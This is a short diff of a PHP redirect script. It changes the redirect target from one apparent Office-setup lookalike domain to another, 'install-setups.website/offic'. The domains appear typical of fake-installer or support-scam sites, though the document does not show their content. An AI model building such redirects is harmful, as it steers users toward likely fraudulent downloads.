@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www-office.uk/setup/");
+header("Location: https://install-setups.website/offic");
 die();
 ?>
